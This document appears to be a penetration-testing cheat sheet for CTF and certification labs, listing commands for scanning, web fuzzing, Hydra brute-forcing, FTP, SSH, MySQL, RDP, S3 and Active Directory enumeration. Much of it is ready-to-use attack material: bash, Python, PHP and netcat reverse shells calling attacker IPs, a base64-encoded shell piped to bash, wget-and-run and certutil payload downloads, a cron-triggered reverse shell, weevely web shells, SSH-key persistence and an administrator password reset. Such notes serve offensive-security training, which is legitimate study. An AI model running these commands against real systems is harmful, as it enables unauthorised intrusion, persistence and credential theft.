
<p align="center">
  <img width="300" height="300" src="/Image/OSCE.svg">
</p>

# OSCE3 Cheat Sheet
[bug-bounty-dorks](https://github.com/sushiwushi/bug-bounty-dorks)
[Endpoin](/Endpoin.md)
> [!IMPORTANT]
> - ```find /  -perm -u=s -type f 2>/dev/null``` to see the permission
> - `sudo -l`
> ## Find the flag file
> - ```find / -name local.txt 2> /dev/null```
> - `find / -iname user.txt -exec wc {} \;`
> - `find . -name user.txt -exec wc -c {} \; -exec cat {} \;`
> - `find / -iname root.txt -exec wc {} \;`
> - ``` find -type d -name ".*" 2>/dev/null``` it will check hidden directories.

- [Useful_links](/links.md)
- [0. Service Port](/port.md)
- [1. Nmap](#nmap)
- [2. Endpoints Enum](#endpoint)
- [3. Subdomain Enum](#subdomain)
- [4. Hydra](#hydra)
- [5. netcat](#nc)
- [5.FTP](#ftp)
- [6. SSH](#ssh)
- [7. shell upgreade](#shell)
- [8. SMB](/smb.md)
- [9. Mysql](#mysql)
- [10. Cewl](#cewl) - It is use to create a worldlist using website link
- [12. Post-Exploit Enumeration](#post)
- [13. Password Cracking](/hash_cracking.md)
- [14. RDP-3389](#rdp)
- [15. Active Directory](#AD)
- [16. Metasploit](/metasploit.md)
- [18. Reverse_Shell_Script](#rev)
- [19. Privilege escalation](/Privilege.md)
- [20. Email Harversting with theHarvester](#email)
- [21. Simple Local Web Servers](#localweb)
- [22. BurpSuite](/burpsuite.md)
- [Linux Forensics](/linux_forensics.md)
# Windows
- [I. certutil](#certutil)
- [II. Mimikatz](/Notes/mimi.md)

# 1. Nmap  <a name="nmap"></a>
- `nmap -pn -p- -A -T4 <ip> -o result`
- [Nmap](/nmap.md)

# 2. Endpoints Enum <a name="endpoint"></a>

##### dirb
- `dirb http://10.10.10.129`
- `dirb http://10.10.1.11 -u admin:password123`

##### dirsearch
- `dirsearch -u https://example.com/`

##### FeroxBuster
- `feroxbuster -u https://vulnerable.com`

##### wfuzz
- `wfuzz -w wordlist.txt https://example.com/FUZZ`

##### gobuster
- `gobuster dir -u <url>  -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt`
- `gobuster dir -u <url> -k -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt`
- `gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://192.168.60.132 -t 50 -x php,txt -o  gobuster.txt`
- `gobuster dir -w /usr/share/wordlists/dirb/big.txt -u http://192.168.54.84 -t 100 -x .html,.txt,.php `



##### ffuf 
- `ffuf -u <url>/FUZZ -k -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt`
- __if you are getting the size same of all use filter size and give the size there. subdomain__
  - `ffuf -u <url>/FUZZ -k -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -r -fs 27200`
- `wfuzz -u http://target-ip/path/index.php?action=authenticate -d 'username=admin&password=FUZZ' -w /usr/share/wordlists/rockyou.txt`


# 3. Subdomain Enum <a name="subdomain"></a>
> [!NOTE]
> - __Sometimes Insted of domain name use ip__
> - Example `ffuf -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -u http://10.10.180.79/ -H "Host: FUZZ.futurevera.thm" -fs 0`
##### ffuf
- `ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://cyprusbank.thm/  -H 'Host: FUZZ.cyprusbank.thm' -fw 1`
- `ffuf -u 'http://cyprusbank.thm/' -H "Host: FUZZ.cyprusbank.thm" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -mc all -t 100 -ic -fw 1`
- `ffuf -u http://test.com -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H ‘Host: FUZZ.test.com’ -fs 0 -fs 65`
- `ffuf -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -u http://futurevera.thm/ -H "Host: FUZZ.futurevera.thm" -fw 1 -t 100`
- `ffuf -u http://10.10.180.79 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -H "HOST:FUZZ.10.10.180.79" `
- `ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt  -H "Host: FUZZ.futurevera.thm" -u https://10.10.180.79 -fs 4605 -c`

##### gobuster
- `gobuster vhost -u https://futurevera.thm -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -k --append-domain `

##### sublist3r
- __`sudo apt-get install sublist3r`__
- __`sublist3r -d <domain name>` or `sublist3r -d <domain name> -e google,yahoo`__




# 4. Hydra <a name="hydra"></a>

- `hydra -l admin -P /usr/share/wordlists/rockyou.txt 127.0.0.1 ssh`
- `hydra -L /usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/wordlists/rockyou.txt 127.0.0.1 ssh -t 50`
- `hydra -l root -P /usr/share/wordlists/rockyou.txt 127.0.0.1 mysql`
- `hydra -l admin -P /usr/share/wordlists/fasttrack.txt 127.0.0.1 ftp`
- `hydra -L/usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt 192.198.30.3 -t 4 ftp`
- `hydra -l admin -P /usr/share/wordlists/fasttrack.txt 127.0.0.1 -s 4567 pop3`
- `hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt rdp://<target ip> -s <target port>`
- `hydra -P /usr/share/wordlists/rockyou.txt 127.0.0.1 smtp -V`
- `hydra -C <combinations.txt> <ip> <service>`

##### Website Login
- Login page 
- http://127.0.0.0/DVWA/vulnerabilities/brute/index.php
- `hydra -l admin -P /usr/share/wordlists/rockyou.txt  127.0.0.1 http-post-form "/DVWA/vulnerabilities/brute/index.php:userField=^USER^:passwordField=^PASS^"`



# 5. netcat <a name="nc"></a>
- __`nc -lvnp 2323`__
```php
<?php
 exec("/bin/bash -c 'bash -i >& /dev/tcp/attackerip/553 0>&1'");
?>
```
```Bash
bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
```
```py
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<Your_ip>",5555));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
##### weevely
- `weevely generate password ~/Desktop/shell.jpg`
- `weevely <url_where_the_file_uploaded>/shell.jpg/shell.php password`

### If you have commands to enter then use the below scripts
```bash
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc <Your_ip> 1234 > /tmp/f
```
```
wget 10.8.1.72/shell.sh && bash shell.sh
```
__Download the reverse shell in windows__
  - > __First we need to host the file in your kali linux__
    - __`cd /usr/share/windows-binaries/`__
    - __`python -m SimpleHTTPServer 80`__
  - > __Go to the target windows system type the below command in the `cmd`__
    - __`certutil -urlcache -f http://<attacker_ip>/nc.exe net.exe`__
  - > __run the below command in kali linux__
    > __`nc -nvlp 1234`__
  - > __we need to run the file in target system__
    - __`new.exe -nv <attacker ip> 1234 -e cmd.exe`__
   


# 5. FTP <a name="ftp"></a>
- `ftp  192.168.112.50 21`
- __user:anonymous__
- __pass:__
- `wget -r ftp://anonymous:anonymous@192.168.204.157/`
- to upload a file use ```put <filename>```
- to download a file use ```get <filename>```
- `hydra -L /unix_users.txt -P /unix_passwords.txt 192.168.112.50 ftp`

# 6. SSH <a name="ssh"></a>
- `ssh admin@10.10.10.123`
- Downloading a file from a remote system.
  - `scp user@10.10.10.10:/home/user/secret.zip .`

#### Adding SSH Public key 
- > This can be used to get ssh session, on target machine which is based on linux
```bash
ssh-keygen -t rsa -b 4096 #give any password

#This created both id_rsa and id_rsa.pub in ~/.ssh directory
#Copy the content in "id_rsa.pub" and create ".ssh" directory in /home of target machine.
chmod 700 ~/.ssh
nano ~/.ssh/authorized_keys #enter the copied content here
chmod 600 ~/.ssh/authorized_keys 

#On Attacker machine
ssh username@target_ip #enter password if you gave any
```
- [SSH](/ssh.md)
  





# 7. shell upgrade <a name="shell"></a>

- [Upgrade to Fully Interactive TTY](/Notes/TTY.md)

### TTY Shell
```sh
python -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/bash")'
echo 'os.system('/bin/bash')'
/bin/sh -i
/bin/bash -i
perl -e 'exec "/bin/sh";'
```

- `export TERM=linux` or `export TERM=xterm`

```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.157",1235));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```
- __`nc -lnvp 1235`__

- __This script, once triggered by the cron, connects back to my attacker machine using a reverse shell on port 31337.__
```
echo "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.157\",31337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);" > .exploit.py
```
- __`nc -lnvp 31337`__
- 

# [8. SMB](/smb.md)



# 9. Mysql <a name="mysql"></a>
- `mysql -h 10.0.1.22 -u root`
    - select 'This is a test' into outfile '/tmp/test' from mysql.user limit 1;
      - > if executed, confirms the ability to write files on the web server.
        > ![image](https://github.com/Chittu13/web/blob/main/Image/mysql.png)
    - Now navigate to that path where you write the shell.php

        - `<url>/shell.php?cmd=id`
        - `<url>/shell.php?cmd=cat /etc/passwd`






# 10. Cewl <a name="cewl"></a>
- ```cewl -w passwords.txt http://192.168.245.48:1898/?q=node/1```
















# 12. [Password Cracking](/hash_cracking.md)






# 13. RDP-3389 <a name="rdp"></a>

- `hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /user/share/metasploit-framework/data/wordlists/unix_passwords.txt rdp://<target ip> -s <target port>`

- `xfreerdp /u:administrator /p:qwertyuiop /v:<target> ip:<port_number>`

- __`search enable_rdp`__
```
use post/windows/manage/enable_rdp
set sesstion 1
exploit
```
- __now you can change the password for the user in my case i have access to the administrator account__
- __so i have meterpreter session running in the background__
- __so use `shell`__
- __change the password__
- __`net user administrator password123`__
- > you have change the password of the admininstrator so that we can login using `xfreerdp` into rdp using this login
- __`xfreerdp /u:administrator /p:password123 /v:<targetip>`__






# [15. Metasploit](/metasploit.md)

# AWS S3 Bucket <a name="s3"></a>
- __Target url `http://darkinjector-phish.s3-website-us-west-2.amazonaws.com/`__
- __aws s3 ls s3://darkinjector-phish/ --region us-west-2 --no-sign-request__
```
┌──(root㉿kali)-[~]
└─# aws s3 ls s3://darkinjector-phish/ --region us-west-2 --no-sign-request
2025-03-17 06:46:17        132 captured-logins-093582390
2025-03-17 06:25:33       2300 index.html

```
  - __It lists the files in the S3 bucket named darkinjector-phish (root folder of the bucket).__
  - __It specifies that the bucket is in the us-west-2 region (Oregon).__
  
- __`aws s3 cp s3://darkinjector-phish/captured-logins-093582390 . --region us-west-2 --no-sign-request`__
```
┌──(root㉿kali)-[~]
└─# aws s3 cp s3://darkinjector-phish/captured-logins-093582390 . --region us-west-2 --no-sign-request

download: s3://darkinjector-phish/captured-logins-093582390 to ./captured-logins-093582390
```
### 📝 So this command does:
- __✅ Downloads the file named captured-logins-093582390__
- __✅ From the S3 bucket named darkinjector-phish__
- __✅ To your current directory on your local system__
- __✅ Without needing authentication (public access)__
- __✅ In the us-west-2 region__


# 15. Active Directory <a name="AD"></a>
- __Workstation (user)	`445, 139, 135, 3389, 5985`	✅ Uses AD services, but doesn’t host them (ONLY AD)__
- __Domain Controller	`88, 389, 445, 3268, 464, 9389`	✅ Hosts AD services (AD with DC)__

- Target
- `nano /etc/hosts`
- `10.10.210.170 labyrinth.thm.local thm.local thm-LABYRINTH-CA thm.local0`

```
┌──(root㉿kali)-[~]
└─# nxc smb labyrinth.thm.local -u 'guest' -p ''
SMB         labyrinth.thm.local 445    LABYRINTH        [*] Windows 10 / Server 2019 Build 17763 x64 (name:LABYRINTH) (domain:thm.local) (signing:True) (SMBv1:False)
SMB         labyrinth.thm.local 445    LABYRINTH        [+] thm.local\guest: 
```
### or
```
┌──(root㉿kali)-[~]
└─# crackmapexec smb labyrinth.thm.local -u 'guest' -p ''
SMB         labyrinth.thm.local 445    LABYRINTH        [*] Windows 10 / Server 2019 Build 17763 x64 (name:LABYRINTH) (domain:thm.local) (signing:True) (SMBv1:False)
SMB         labyrinth.thm.local 445    LABYRINTH        [+] thm.local\guest: 
```
- __enumerating the domain controller for users and policies__
```
┌──(root㉿kali)-[~]
└─# nxc ldap 10.10.214.56 -u "a" -p "" --users
LDAP        10.10.214.56    389    LABYRINTH        IVY_WILLIS                    2023-05-30 12:30:55 0       Please change it: ************
LDAP        10.10.214.56    389    LABYRINTH        SUSANNA_MCKNIGHT              2023-07-05 15:11:32 0       Please change it: ************
```

- __checking if rdp login is there are not__
```
┌──(root㉿kali)-[~]
└─# nxc rdp 10.10.214.56 -u "IVY_WILLIS" -p "************"
RDP         10.10.214.56    3389   LABYRINTH        [*] Windows 10 or Windows Server 2016 Build 17763 (name:LABYRINTH) (domain:thm.local) (nla:True)
RDP         10.10.214.56    3389   LABYRINTH        [+] thm.local\IVY_WILLIS:************ 

┌──(root㉿kali)-[~]
└─# nxc rdp 10.10.214.56 -u "SUSANNA_MCKNIGHT" -p "************"
RDP         10.10.214.56    3389   LABYRINTH        [*] Windows 10 or Windows Server 2016 Build 17763 (name:LABYRINTH) (domain:thm.local) (nla:True)
RDP         10.10.214.56    3389   LABYRINTH        [+] thm.local\SUSANNA_MCKNIGHT:************ (Pwn3d!)
```







# 16. Reverse_Shell_Script <a name="rev"></a> ---> (nc -lvnp 9001)
- [revshells.com](https://revshells.com)
- __`bash -c 'bash -i >& /dev/tcp/yourip/9001 0>&1'`__
- __Sometimes you need to encode__
  - __`bash -c 'bash -i >& /dev/tcp/yourip/9001 0>&1'`__ __save this in tmp file__
  - __`cat tmp | base64 -w 0`__
  - __`echo <encoded_command> | base64 -d | bash`__
- __PHP reverse shell__
    - __`<?php system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.15.154 8082 >/tmp/f"); ?>`__
    - __`nc -lnvp 8082`__
 - __SHELL script__
 - __`echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.15.154 8083 > /tmp/f" >> monitor.sh`__
 - __`nc -lnvp 8083`__



# [17. Privilege escalation](/Privilege.md)



# 18. Email Harversting with theHarvester <a name="email"></a>
- __`theHarvester -d <domain name> -b google,linkedin,yahoo,dnsdumpster,duckduckgo,crtsh,rapdiddns`__





# 19. Simple Local Web Servers <a name="localweb"></a>

```
python -m SimpleHTTPServer 80
```

```
python3 -m http.server
```

```
php -S 0.0.0.0:80
```
# Windows 
## I. certutil <a name="certutil"></a>
- `certutil -urlcache -f http://10.1.23.11/revshell.exe revshell.exe`
- 
## [II. Mimikatz](/Notes/mimi.md)




# [22. BurpSuite](/burpsuite.md)
